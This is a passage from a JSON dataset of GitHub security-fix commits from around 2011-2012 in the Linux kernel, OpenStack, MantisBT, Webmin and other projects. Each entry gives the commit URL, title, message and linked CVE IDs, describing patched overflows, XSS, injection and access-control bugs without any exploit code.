    "url": "https://github.com/torvalds/linux/commit/e0bccd315db0c2f919e7fcf9cb60db21d9986f52",
    "title": "rose: Add length checks to CALL_REQUEST parsing",
    "body": "Define some constant offsets for CALL_REQUEST based on the descriptionat <http://www.techfest.com/networking/wan/x25plp.htm> and thedefinition of ROSE as using 10-digit (5-byte) addresses. Use themconsistently. Validate all implicit and explicit facilities lengths.Validate the address length byte rather than either trusting orassuming its value.Signed-off-by: Ben Hutchings <ben@decadent.org.uk>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2011-4914"
    ],
    "cveIdsCount": 1
  },
  "85dfc618a11d389b1d6eead361b8f9a76e1ccad3527167b45243431d51180a9a": {
    "url": "https://github.com/silverstripe/sapphire/commit/16c3235",
    "title": "BUGFIX Escaping base URLs for anchor links rewritten by SSViewer::pro…",
    "body": "…cess() with the 'rewriteHashlinks' option enabled (which is a framework default, and necessary because of the use of a <base> tag). Also added escaping for base URLs rendered through the 'php' variation of 'rewriteHashlinks'",
    "cveIds": [
      "CVE-2011-4958"
    ],
    "cveIdsCount": 1
  },
  "651df4351c30651529f79282dbc20344ad1dfb152b8e40361437ee28a90f9744": {
    "url": "https://github.com/silverstripe/sapphire/commit/bdd6391",
    "title": "BUGFIX Respecting SSViewer::$options[\"rewriteHashlinks\"] in SSViewer:…",
    "body": "…:process()",
    "cveIds": [
      "CVE-2011-4958"
    ],
    "cveIdsCount": 1
  },
  "2df2cce37e0cbdd346065a9b56f6dce44cb7d0391802471ffe34b064d15e4954": {
    "url": "https://github.com/splitbrain/dokuwiki/commit/ff71173477e54774b5571015d49d944f51cb8a26",
    "title": "escape target error message (SECURITY) FS#2487 FS#2488",
    "body": "The error message when a non-existant editor was tried to load wasn'tescaped correctly, allowing to introduce arbitrary JavaScript to theoutput, leading to a XSS vulnerability.Note: the reported second XCRF vulnerability is the same bug, the xploitcode simply uses JavaScript to extract a valid CSRF token from the site",
    "cveIds": [
      "CVE-2012-2129"
    ],
    "cveIdsCount": 1
  },
  "94ddde0b3a618b74087e0852f565803f8d5a7f65ef236c1dc01c5e6b4f6078d2": {
    "url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
    "title": "hugepages: fix use after free bug in \"quota\" handling",
    "body": "hugetlbfs_{get,put}_quota() are badly named. They don't interact with thegeneral quota handling code, and they don't much resemble its behaviour.Rather than being about maintaining limits on on-disk block usage byparticular users, they are instead about maintaining limits on in-memorypage usage (including anonymous MAP_PRIVATE copied-on-write pages)associated with a particular hugetlbfs filesystem instance.Worse, they work by having callbacks to the hugetlbfs filesystem code fromthe low-level page handling code, in particular from free_huge_page().This is a layering violation of itself, but more importantly, if thekernel does a get_user_pages() on hugepages (which can happen from KVMamongst others), then the free_huge_page() can be delayed until after theassociated inode has already been freed. If an unmount occurs at thewrong time, even the hugetlbfs superblock where the \"quota\" limits arestored may have been freed.Andrew Barry proposed a patch to fix this by having hugepages, instead ofstoring a pointer to their address_space and reaching the superblock fromthere, had the hugepages store pointers directly to the superblock,bumping the reference count as appropriate to avoid it being freed.Andrew Morton rejected that version, however, on the grounds that it madethe existing layering violation worse.This is a reworked version of Andrew's patch, which removes the extra, andsome of the existing, layering violation. It works by introducing theconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is afinite logical pool of hugepages to allocate from. hugetlbfs now createsa subpool for each filesystem instance with a page limit set, and apointer to the subpool gets added to each allocated hugepage, instead ofthe address_space pointer used now. The subpool has its own lifetime andis only freed once all pages in it _and_ all other references to it (i.e.superblocks) are gone.subpools are optional - a NULL subpool pointer is taken by the code tomean that no subpool limits are in effect.Previous discussion of this bug found in: \"Fix refcounting in hugetlbfsquota handling.\". See: https://lkml.org/lkml/2011/8/11/28 orhttp://marc.info/?l=linux-mm&m=126928970510627&w=1v2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter toalloc_huge_page() - since it already takes the vma, it is not necessary.Signed-off-by: Andrew Barry <abarry@cray.com>Signed-off-by: David Gibson <david@gibson.dropbear.id.au>Cc: Hugh Dickins <hughd@google.com>Cc: Mel Gorman <mgorman@suse.de>Cc: Minchan Kim <minchan.kim@gmail.com>Cc: Hillf Danton <dhillf@gmail.com>Cc: Paul Mackerras <paulus@samba.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2012-2133"
    ],
    "cveIdsCount": 1
  },
  "0f41d4cd35a1e8160eb05512c9fa8ea73c415e74ed0ec1112ed6f71225f77a85": {
    "url": "https://github.com/torvalds/linux/commit/cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc",
    "title": "net: sock: validate data_len before allocating skb in sock_alloc_send…",
    "body": "…_pskb()We need to validate the number of pages consumed by data_len, otherwise fragsarray could be overflowed by userspace. So this patch validate data_len andreturn -EMSGSIZE when data_len may occupies more frags than MAX_SKB_FRAGS.Signed-off-by: Jason Wang <jasowang@redhat.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-2136"
    ],
    "cveIdsCount": 1
  },
  "41daf72fa857231493b580038fc000490fb60628c30f3ee0d9ec137e6f77a494": {
    "url": "https://github.com/mikel/mail/commit/ac56f03bdfc30b379aeecd4ff317d08fdaa328c2",
    "title": "Fix security vulnerability allowing command line exploit when using e…",
    "body": "…xim or sendmail from the command line",
    "cveIds": [
      "CVE-2012-2140"
    ],
    "cveIdsCount": 1
  },
  "dbd45376eb5a74a7bba2b8c12b9a02a73e464da5434b5a5ad9416534dd77e9bc": {
    "url": "https://github.com/mikel/mail/commit/39b590ddb08f90ddbe445837359a2c8843e533d0",
    "title": "Making sure that destinations are also properly escaped in all versio…",
    "body": "…n of ruby",
    "cveIds": [
      "CVE-2012-2140"
    ],
    "cveIdsCount": 1
  },
  "ccf7e3a9afefb63a3ad071d808f98272c3dd3a0e6ef8dbb5ff770b1338420c4f": {
    "url": "https://github.com/torvalds/linux/commit/1bb57e940e1958e40d51f2078f50c3a96a9b2d75",
    "title": "dl2k: Clean up rio_ioctl",
    "body": "The dl2k driver's rio_ioctl call has a few issues:- No permissions checking- Implements SIOCGMIIREG and SIOCGMIIREG using the SIOCDEVPRIVATE numbers- Has a few ioctls that may have been used for debugging at one point but have no place in the kernel proper.This patch removes all but the MII ioctls, renumbers them to use thestandard ones, and adds the proper permission check for SIOCSMIIREG.We can also get rid of the dl2k-specific struct mii_data in favor ofthe generic struct mii_ioctl_data.Since we have the phyid on hand, we can add the SIOCGMIIPHY ioctl too.Most of the MII code for the driver could probably be converted to usethe generic MII library but I don't have a device to test the results.Reported-by: Stephan Mueller <stephan.mueller@atsec.com>Signed-off-by: Jeff Mahoney <jeffm@suse.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2012-2313"
    ],
    "cveIdsCount": 1
  },
  "a4ae5989c8e7a5fc185bb8db26dced72aa1ce2dd082ef7acccabde43ef3d40a7": {
    "url": "https://github.com/torvalds/linux/commit/6f24f892871acc47b40dd594c63606a17c714f77",
    "title": "hfsplus: Fix potential buffer overflows",
    "body": "Commit ec81aec (\"hfs: fix a potential buffer overflow\") fixed a fewpotential buffer overflows in the hfs filesystem. But as Timo Warnspointed out, these changes also need to be made on the hfsplusfilesystem as well.Reported-by: Timo Warns <warns@pre-sense.de>Acked-by: WANG Cong <amwang@redhat.com>Cc: Alexey Khoroshilov <khoroshilov@ispras.ru>Cc: Miklos Szeredi <mszeredi@suse.cz>Cc: Sage Weil <sage@newdream.net>Cc: Eugene Teo <eteo@redhat.com>Cc: Roman Zippel <zippel@linux-m68k.org>Cc: Al Viro <viro@zeniv.linux.org.uk>Cc: Christoph Hellwig <hch@lst.de>Cc: Alexey Dobriyan <adobriyan@gmail.com>Cc: Dave Anderson <anderson@redhat.com>Cc: stable <stable@vger.kernel.org>Cc: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2012-2319"
    ],
    "cveIdsCount": 1
  },
  "0c4f49bc8fd6fc90af899b98fdfbbd9c7036b90f05dbeb42835d0007cbafc4e2": {
    "url": "https://github.com/torvalds/linux/commit/20e0fa98b751facf9a1101edaefbc19c82616a68",
    "title": "Fix length of buffer copied in __nfs4_get_acl_uncached",
    "body": "_copy_from_pages() used to copy data from the temporary buffer to theuser passed buffer is passed the wrong size parameter when copyingdata. res.acl_len contains both the bitmap and acl lenghts whileacl_len contains the acl length after adjusting for the bitmap size.Signed-off-by: Sachin Prabhu <sprabhu@redhat.com>Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>",
    "cveIds": [
      "CVE-2012-2375"
    ],
    "cveIdsCount": 1
  },
  "a4e780e5d0aadbe87d4c38147e8a193c6ed296fa9e28ca33dad7df06e2bf4f4c": {
    "url": "https://github.com/torvalds/linux/commit/ed8cd3b2cd61004cab85380c52b1817aca1ca49b",
    "title": "drm/i915: fix integer overflow in i915_gem_execbuffer2()",
    "body": "On 32-bit systems, a large args->buffer_count from userspace via ioctlmay overflow the allocation size, leading to out-of-bounds access.This vulnerability was introduced in commit 8408c28 (\"drm/i915:First try a normal large kmalloc for the temporary exec buffers\").Signed-off-by: Xi Wang <xi.wang@gmail.com>Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk>Cc: stable@vger.kernel.orgSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>",
    "cveIds": [
      "CVE-2012-2383"
    ],
    "cveIdsCount": 1
  },
  "e8097c6b2c3f85c0ac7f7fd28c7d6650fd0b347ba0c8acfdb9acb1996ae3768d": {
    "url": "https://github.com/torvalds/linux/commit/44afb3a04391a74309d16180d1e4f8386fdfa745",
    "title": "drm/i915: fix integer overflow in i915_gem_do_execbuffer()",
    "body": "On 32-bit systems, a large args->num_cliprects from userspace via ioctlmay overflow the allocation size, leading to out-of-bounds access.This vulnerability was introduced in commit 432e58e (\"drm/i915: Avoidallocation for execbuffer object list\").Signed-off-by: Xi Wang <xi.wang@gmail.com>Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk>Cc: stable@vger.kernel.orgSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>",
    "cveIds": [
      "CVE-2012-2384"
    ],
    "cveIdsCount": 1
  },
  "48576e98df9428b1f020d28ba184e2f991e24eb99c770db0279b53d6e086481d": {
    "url": "https://github.com/keithw/mosh/commit/9791768705528e911bfca6c4d8aa88139035060e",
    "title": "Cap escape sequence parameters to prevent long loops.",
    "body": "Fixes #271 github issue.",
    "cveIds": [
      "CVE-2012-2385"
    ],
    "cveIdsCount": 1
  },
  "ae0c4fd2b8a53efcf828efc1cc7c7a2bea3b2afd9249231727da24bb6de4849f": {
    "url": "https://github.com/torvalds/linux/commit/c50ac050811d6485616a193eb0f37bfbd191cc89",
    "title": "hugetlb: fix resv_map leak in error path",
    "body": "When called for anonymous (non-shared) mappings, hugetlb_reserve_pages()does a resv_map_alloc(). It depends on code in hugetlbfs'svm_ops->close() to release that allocation.However, in the mmap() failure path, we do a plain unmap_region() withoutthe remove_vma() which actually calls vm_ops->close().This is a decent fix. This leak could get reintroduced if new code (say,after hugetlb_reserve_pages() in hugetlbfs_file_mmap()) decides to returnan error. But, I think it would have to unroll the reservation anyway.Christoph's test case:http://marc.info/?l=linux-mm&m=133728900729735This patch applies to 3.4 and later. A version for earlier kernels is athttps://lkml.org/lkml/2012/5/22/418.Signed-off-by: Dave Hansen <dave@linux.vnet.ibm.com>Acked-by: Mel Gorman <mel@csn.ul.ie>Acked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>Reported-by: Christoph Lameter <cl@linux.com>Tested-by: Christoph Lameter <cl@linux.com>Cc: Andrea Arcangeli <aarcange@redhat.com>Cc: <stable@vger.kernel.org>[2.6.32+]Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2012-2390"
    ],
    "cveIdsCount": 1
  },
  "2586c239aea73dadb7f36a4ca6dc15c037d9698c020ed394875c6aa487ba53cb": {
    "url": "https://github.com/Legrandin/pycrypto/commit/9f912f13df99ad3421eff360d6a62d7dbec755c2",
    "title": "Fix to bug #985164 (ElGamal key generation). Fix to missing range che…",
    "body": "…ck in signature verification.",
    "cveIds": [
      "CVE-2012-2417"
    ],
    "cveIdsCount": 1
  },
  "1cddaa8f29bb682d734381591ff9615cae9ce6628d9a5259bab6fa53aa776fe8": {
    "url": "https://github.com/openstack/nova/commit/9f9e9da777161426a6f8cb4314b78e09beac2978",
    "title": "Fix up protocol case handling for security groups.",
    "body": "Fix bug 985184.When creating security group rules, any case for the protocol wasaccepted as input, such as TCP, Tcp, tcp, etc., and was stored in thedatabase as specified. However, unless specified as all lowercase, thecode to apply the rules would break and result in some rules not beingapplied.(cherry picked from commit ff06c7c)Change-Id: If737104f492aacd3688f04d78eb9bc993ffa33fc",
    "cveIds": [
      "CVE-2012-2654"
    ],
    "cveIdsCount": 1
  },
  "825e953d6344ec003ef5e2538c06dbf7b70871431dec8d106a36b0bf475e599d": {
    "url": "https://github.com/openstack/nova/commit/ff06c7c885dc94ed7c828e8cdbb8b5d850a7e654",
    "title": "Fix up protocol case handling for security groups.",
    "body": "Fix bug 985184.When creating security group rules, any case for the protocol wasaccepted as input, such as TCP, Tcp, tcp, etc., and was stored in thedatabase as specified. However, unless specified as all lowercase, thecode to apply the rules would break and result in some rules not beingapplied.Change-Id: I6c723d371579eb37a94bd484d39beeb773668ed4",
    "cveIds": [
      "CVE-2012-2654"
    ],
    "cveIdsCount": 1
  },
  "7b3296bd3a923fba48a81bfd424801028b960ea98f2c7d3e1f1bb5b41e8d6eb9": {
    "url": "https://github.com/torvalds/linux/commit/bcc2c9c3fff859e0eb019fe6fec26f9b8eba795c",
    "title": "Tools: hv: verify origin of netlink connector message",
    "body": "The SuSE security team suggested to use recvfrom instead of recv to becertain that the connector message is originated from kernel.CVE-2012-2669Signed-off-by: Olaf Hering <olaf@aepfle.de>Signed-off-by: Marcus Meissner <meissner@suse.de>Signed-off-by: Sebastian Krahmer <krahmer@suse.de>Signed-off-by: K. Y. Srinivasan <kys@microsoft.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2012-2669"
    ],
    "cveIdsCount": 1
  },
  "ed6c2d69ae7b0c8cba0af2dc75239fecec13e22767995428ae57afba99ac3f54": {
    "url": "https://github.com/ivmai/bdwgc/commit/83231d0ab5ed60015797c3d1ad9056295ac3b2bb",
    "title": "Speedup calloc size overflow check by preventing division if small va…",
    "body": "…lues* malloc.c (GC_SQRT_SIZE_MAX): New macro.* malloc.c (calloc): Add fast initial size overflow check to avoidinteger division for reasonably small values passed.",
    "cveIds": [
      "CVE-2012-2673"
    ],
    "cveIdsCount": 1
  },
  "005b7fc7cb246f52da26aab15e1c52a1fe166cc17722df368f01e65061979ebd": {
    "url": "https://github.com/ivmai/bdwgc/commit/6a93f8e5bcad22137f41b6c60a1c7384baaec2b3",
    "title": "Fix calloc-related code to prevent SIZE_MAX redefinition in sys headers",
    "body": "* malloc.c: Include limits.h for SIZE_MAX.* malloc.c (SIZE_MAX, calloc): Define GC_SIZE_MAX instead of SIZE_MAX.",
    "cveIds": [
      "CVE-2012-2673"
    ],
    "cveIdsCount": 1
  },
  "98d14c4bdf3cee56a3ea20fe578b651e42e631393c544d67d031e6a1f4628d05": {
    "url": "https://github.com/ivmai/bdwgc/commit/e10c1eb9908c2774c16b3148b30d2f3823d66a9a",
    "title": "Fix calloc() overflow",
    "body": "* malloc.c (calloc): Check multiplication overflow in calloc(),assuming REDIRECT_MALLOC.",
    "cveIds": [
      "CVE-2012-2673"
    ],
    "cveIdsCount": 1
  },
  "ec4d644f92df9d491363649ddc8598e8c4e398f47b2633e3d59cc7dabd88eeb0": {
    "url": "https://github.com/ivmai/bdwgc/commit/be9df82919960214ee4b9d3313523bff44fd99e1",
    "title": "Fix allocation size overflows due to rounding.",
    "body": "* malloc.c (GC_generic_malloc): Check if the allocation size isrounded to a smaller value.* mallocx.c (GC_generic_malloc_ignore_off_page): Likewise.",
    "cveIds": [
      "CVE-2012-2673"
    ],
    "cveIdsCount": 1
  },
  "b4b9b0cb730db030f1a558e50e1dc868e2da8c54596e4501f77cb93380ae7ec4": {
    "url": "https://github.com/android/platform_bionic/commit/7f5aa4f35e23fd37425b3a5041737cdf58f87385",
    "title": "bionic: fix integer overflows in chk_malloc(), leak_malloc(), and lea…",
    "body": "…k_memalign()The allocation size in chk_malloc(), leak_malloc(), and leak_memalign()functions may be rounded up to a small value, leading to buffer overflows.The code only runs in debugging mode.This patch complements commit 6f04a0f (CVE-2009-0607).Change-Id: Id899bcd2bcd2ea2205e5753c433390710032dc83Signed-off-by: Xi Wang <xi.wang@gmail.com>",
    "cveIds": [
      "CVE-2012-2674"
    ],
    "cveIdsCount": 1
  },
  "324697944fa4edc7817f276ea4393462c5d664dd9b2638ad3642995ae0c187c9": {
    "url": "https://github.com/ned14/nedmalloc/commit/1a759756639ab7543b650a10c2d77a0ffc7a2000",
    "title": "Avoid overflowing allocation size in CallMalloc()",
    "body": "The wraparound could happen if USE_MAGIC_HEADERS is enabled.",
    "cveIds": [
      "CVE-2012-2675"
    ],
    "cveIdsCount": 1
  },
  "9a1467ef9fe0e49dce7028ac210f55e83d5f6060ee829839b7f6d14d6c9212a0": {
    "url": "https://github.com/mantisbt/mantisbt/commit/edc8142bb8ac0ac0df1a3824d78c15f4015d959e",
    "title": "Fix #14340: Reporters can use SOAP to update bugnotes without permission",
    "body": "The access checks inside bugnote_update.php andapi/soap/mc_issue_api.php differed. Users were incorrectly allowed viathe SOAP interface to update the bugnotes of other users. Instead ofcomparing the SOAP user's access level to $g_update_bugnote_threshold,$g_add_bugnote_threshold was used instead.This posed a problem because the default installed state of MantisBT isto allow the REPORTER access level to submit bugs via the SOAP API. Thusin the default installed state, any user who could submit a bug couldalso update/modify the bugnotes of any other user.Access checks within bugnote_update.php and api/soap/mc_issue_api.phpshould now be equivalent.Thanks to Roland Becker and Damien Regard (both MantisBT developers) forfinding and reporting this problem.",
    "cveIds": [
      "CVE-2012-2691"
    ],
    "cveIdsCount": 1
  },
  "afd2f161fda0e2ee8aac4c8dff4e776e5b0e4fd1e24ed664194e9ed6aeb9b747": {
    "url": "https://github.com/mantisbt/mantisbt/commit/175d973105fe9f03a37ced537b742611631067e0",
    "title": "mc_issue_note_update passing wrong param to access check function",
    "body": "Commit edc8142 introduced proper logicto avoid unauthorized update of bugnotes, but was passing incorrectparameters to access_has_bugnote_level() so unprivileged users couldstill update them.Fixes #14340",
    "cveIds": [
      "CVE-2012-2691"
    ],
    "cveIdsCount": 1
  },
  "32d7a166cb3bebfdddc5598e34c212fe3cdd772aba24dfb3cf11c17996d05537": {
    "url": "https://github.com/mantisbt/mantisbt/commit/ceafe6f0c679411b81368052633a63dd3ca06d9c",
    "title": "Fix #14016: delete_attachments_threshold is not checked",
    "body": "Roland Becker (MantisBT developer) reported the followingsecurity/access control bug:In a default installation delete_attachments_threshold is set toDEVELOPER but having access level >= update_bug_threshold is enough todelete attachments if form_security_validation is set to OFF.MantisBT was not checking the access level of the user requestingdeletion of an attachment to an issue against$g_delete_attachments_threshold.The new access control logic for deleting an issue attachment is now:1. Does the user have an access level of at least update_bug_threshold?2. If the user is the owner of the file and$g_allow_delete_own_attachments=OFF, does this user have an access levelof at least delete_attachments_threshold?3. If the user is not the owner of the file, do they have an accesslevel of at least delete_attachments_threshold?Also refer to issue #14015 for discussion on whetherupdate_bug_threshold should be part of the access control logic.The relevant SOAP API call has also been updated.",
    "cveIds": [
      "CVE-2012-2692"
    ],
    "cveIdsCount": 1
  },
  "643c2c79e99403116381d9daf63650fe8f67480aa7704294e86c8ee2f0da446e": {
    "url": "https://github.com/torvalds/linux/commit/79549c6dfda0603dba9a70a53467ce62d9335c33",
    "title": "cred: copy_process() should clear child->replacement_session_keyring",
    "body": "keyctl_session_to_parent(task) sets ->replacement_session_keyring,it should be processed and cleared by key_replace_session_keyring().However, this task can fork before it notices TIF_NOTIFY_RESUME andthe new child gets the bogus ->replacement_session_keyring copied bydup_task_struct(). This is obviously wrong and, if nothing else, thisleads to put_cred(already_freed_cred).change copy_creds() to clear this member. If copy_process() failsbefore this point the wrong ->replacement_session_keyring doesn'tmatter, exit_creds() won't be called.Cc: <stable@vger.kernel.org>Signed-off-by: Oleg Nesterov <oleg@redhat.com>Acked-by: David Howells <dhowells@redhat.com>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2012-2745"
    ],
    "cveIdsCount": 1
  },
  "d5606f72ab07832acbdd769522adbd4020284077bbc2b3ef9fbf7f4d40c4423b": {
    "url": "https://github.com/s9y/Serendipity/commit/87153991d06bc18fe4af05f97810487c4a340a92#diff-1",
    "title": "* Fix SQL injection for comment.php used in read-context.",
    "body": "(Thanks to High-Tech Bridge SA Security Release Lab, Advisory HTB23092)",
    "cveIds": [
      "CVE-2012-2762"
    ],
    "cveIdsCount": 1
  },
  "0809e0fc0960b00c67741ec9708717e4883718047e1ad65c7f2870958bdafb09": {
    "url": "https://github.com/osCommerce/oscommerce/commit/a5aeb0448cc333cc4b801c0e01981b218fd9c7df",
    "title": "Fix a cross site scripting vulnerability.",
    "body": "Reported by: Vulnerability Research Laboratory - Alexander Fuchs (F0x23)Brought to our attention by Te Taipo",
    "cveIds": [
      "CVE-2012-2935"
    ],
    "cveIdsCount": 1
  },
  "bde53524c1e6cd62c60832062dd062ecb656ed7f089f472e9c360223acf9bde9": {
    "url": "https://github.com/webmin/webmin/commit/ed7365064c189b8f136a9f952062249167d1bd9e",
    "title": "Prevent passing in of monitor type that could contain invalid charact…",
    "body": "…ers https://sourceforge.net/tracker/index.php?func=detail&aid=3542038&group_id=17457&atid=117457#",
    "cveIds": [
      "CVE-2012-2981"
    ],
    "cveIdsCount": 1
  },
  "38ba030dc1143c691cc09139b3acea139743a7941551370772f750f41150e64a": {
    "url": "https://github.com/webmin/webmin/commit/4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80",
    "title": "Add access control check when reading HTML file https://sourceforge.n…",
    "body": "…et/tracker/index.php?func=detail&aid=3542038&group_id=17457&atid=117457#",
    "cveIds": [
      "CVE-2012-2983"
    ],
    "cveIdsCount": 1
  },
  "960943c66fa9cd39b52741d7a02783b72d92c8229eb9d06f995839da40a2fc14": {
    "url": "https://github.com/openstack/nova/commit/b0feaffdb2b1c51182b8dce41b367f3449af5dd9",
    "title": "Prevent file injection writing to host filesystem.",
    "body": "Fix bug 1015531, CVE-2012-3360, CVE-2012-3361This patch prevents the file injection code from writing into the hostfilesystem if a user specifies a path for the injected file thatcontains '..'. The check is to make sure that the final normalized paththat is about to be written to is within the mounted guest filesystem.This is a backport of Russell Bryant, Pádraig Brady and MarkMcLoughlin's Folsom patch.Change-Id: Id8bd6ffb4d878467ba2086d341fce23f2ff5aa0a",
    "cveIds": [
      "CVE-2012-3360",
      "CVE-2012-3361"
    ],
    "cveIdsCount": 2
  },
  "c1931157558e84d64891418b196d121fff4762890d696e1cf0c9bccc957e289a": {
    "url": "https://github.com/openstack/nova/commit/2427d4a99bed35baefd8f17ba422cb7aae8dcca7",
    "title": "Prevent file injection writing to host filesystem.",
    "body": "Fix bug 1015531, CVE-2012-3360, CVE-2012-3361This patch prevents the file injection code from writing into the hostfilesystem if a user specifies a path for the injected file thatcontains '..'. The check is to make sure that the final normalized paththat is about to be written to is within the mounted guest filesystem.Signed-off-by: Russell Bryant <rbryant@redhat.com>Signed-off-by: Pádraig Brady <pbrady@redhat.com>Signed-off-by: Mark McLoughlin <markmc@redhat.com>Change-Id: I658cd12fd319cee91eb9544cdf53c862c5d2c560",
    "cveIds": [
      "CVE-2012-3360",
      "CVE-2012-3361"
    ],
    "cveIdsCount": 2
  },
  "c06e83f76a3a5179a270884441e413d7e969d291190eda946e3c92e9b9c7a53d": {
    "url": "https://github.com/torvalds/linux/commit/67de956ff5dc1d4f321e16cfbd63f5be3b691b43",
    "title": "NFC: Prevent multiple buffer overflows in NCI",
    "body": "Fix multiple remotely-exploitable stack-based buffer overflows due tothe NCI code pulling length fields directly from incoming frames andcopying too much data into statically-sized arrays.Signed-off-by: Dan Rosenberg <dan.j.rosenberg@gmail.com>Cc: stable@kernel.orgCc: security@kernel.orgCc: Lauro Ramos Venancio <lauro.venancio@openbossa.org>Cc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org>Cc: Samuel Ortiz <sameo@linux.intel.com>Cc: David S. Miller <davem@davemloft.net>Acked-by: Ilan Elias <ilane@ti.com>Signed-off-by: Samuel Ortiz <sameo@linux.intel.com>",
    "cveIds": [
      "CVE-2012-3364"
    ],
    "cveIdsCount": 1
  },
  "84e53d318d1be9c3ce5592a9075c2717248fb19540ca122bf3c3d29568b3597e": {
    "url": "https://github.com/openstack/nova/commit/034762e8060dcf0a11cb039b9d426b0d0bb1801d",
    "title": "Use compute_api.get_all in affinity filters.",
    "body": "Updates the affinity filters so they make a single compute APIcall to lookup instance host information rather than singlelookups for each UUID.This resolves a potential performance issue which can cause ascheduler to hang while processing requests which contain large numbersof UUID's in the scheduler_hints.Fixes LP Bug #1017795.Change-Id: I30f434faf109058573ee41c4a6abce2e48939e8d",
    "cveIds": [
      "CVE-2012-3371"
    ],
    "cveIdsCount": 1
  },
  "f8928d19724c4f6792dacf210ee643824ab846df9e7a86774f9daa8d2ec9f448": {
    "url": "https://github.com/mono/mono/commit/d16d4623edb210635bec3ca3786481b82cde25a2",
    "title": "HtmlEncode the path",
    "body": "Fixes Novell bug #769799.",
    "cveIds": [
      "CVE-2012-3382"
    ],
    "cveIdsCount": 1
  },
  "c1f3f9f0bc4bdc78a3ed7a377ec57376c51019f06fece9340e9ecd50f0d0fd95": {
    "url": "https://github.com/torvalds/linux/commit/1df2ae31c724e57be9d7ac00d78db8a5dabdd050",
    "title": "udf: Fortify loading of sparing table",
    "body": "Add sanity checks when loading sparing table from disk to avoid accessingunallocated memory or writing to it.Signed-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2012-3400"
    ],
    "cveIdsCount": 1
  },
  "c7925d08c45c7788f086f97a89a27ad9e82712a128dd4bec44f72e03698f8467": {
    "url": "https://github.com/torvalds/linux/commit/adee11b2085bee90bd8f4f52123ffb07882d6256",
    "title": "udf: Avoid run away loop when partition table length is corrupted",
    "body": "Check provided length of partition table so that (possibly maliciously)corrupted partition table cannot cause accessing data beyond current buffer.Signed-off-by: Jan Kara <jack@suse.cz>",
    "cveIds": [
      "CVE-2012-3400"
    ],
    "cveIdsCount": 1
  },
  "1828a635bb960792b1b68cd3d44be7c242ba1f8419ec1e5566574774eaf0e1a2": {
    "url": "https://github.com/puppetlabs/puppet/commit/ab9150baa1b738467a33b01df1d90e076253fbbd",
    "title": "Deprecate IP-based authentication",
    "body": "This will need to be made explicit in a future version, so it's good toget people to stop using it if possible.",
    "cveIds": [
      "CVE-2012-3408"
    ],
    "cveIdsCount": 1
  },
  "d28e5c56a6434e2033a98ecf4769471d8ca25d967a0b00be1423fbbfef8ad6dc": {
    "url": "https://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c",
    "title": "sfc: Fix maximum number of TSO segments and minimum TX queue size",
    "body": "[ Upstream commit 7e6d06f ]Currently an skb requiring TSO may not fit within a minimum-size TXqueue. The TX queue selected for the skb may stall and trigger the TXwatchdog repeatedly (since the problem skb will be retried after theTX reset). This issue is designated as CVE-2012-3412.Set the maximum number of TSO segments for our devices to 100. Thisshould make no difference to behaviour unless the actual MSS is lessthan about 700. Increase the minimum TX queue size accordingly toallow for 2 worst-case skbs, so that there will definitely be spaceto add an skb after we wake a queue.To avoid invalidating existing configurations, changeefx_ethtool_set_ringparam() to fix up values that are too small ratherthan returning -EINVAL.Signed-off-by: Ben Hutchings <bhutchings@solarflare.com>Signed-off-by: David S. Miller <davem@davemloft.net>Signed-off-by: Ben Hutchings <ben@decadent.org.uk>",
    "cveIds": [
      "CVE-2012-3412"
    ],
    "cveIdsCount": 1
  },
  "37cf86b7a7c1e66f045f85c98fc85295da681216fa538d102582c7af0175c232": {
    "url": "http://github.com/openstack/keystone/commit/ea03d05ed5de0c015042876100d37a6a14bf56de",
    "title": "Invalidate user tokens when password is changed",
    "body": "Fixes bug 996595This commit will cause all valid tokens to be deleted for a userwho's password is changed (implemented for the sql and kvs backends)Change-Id: I6ad7da8957b7041983a3fc91d9ba9368667d06ac",
    "cveIds": [
      "CVE-2012-3426"
    ],
    "cveIdsCount": 1
  },
  "59b106bf2dd9edf13459bf860f2391c8eb50fa95be6eefa1d5b3599f7a29828f": {
    "url": "http://github.com/openstack/keystone/commit/628149b3dc6b58b91fd08e6ca8d91c728ccb8626",
    "title": "Invalidate user tokens when a user is disabled",
    "body": "Fixes Bug 997194Delete valid tokens for a user when they have been disabledMoved logic to delete tokens into update_user, as this can be calleddirectly form the REST API.Also checks if a user is enabled when creating a token from anothertoken, this helps in cases there the backend didn't support listing oftokens (and as a result weren't deleted)Change-Id: Ib5ed73a7873bfa66ef31bf6d0f0322f50e677688",
    "cveIds": [
      "CVE-2012-3426"
    ],
    "cveIdsCount": 1
  },
  "d5521b0781b0ce5532770a191f3c2176e31095328866c1e0c5cbece4f5ec843a": {
    "url": "http://github.com/openstack/keystone/commit/375838cfceb88cacc312ff6564e64eb18ee6a355",
    "title": "Carrying over token expiry time when token chaining",
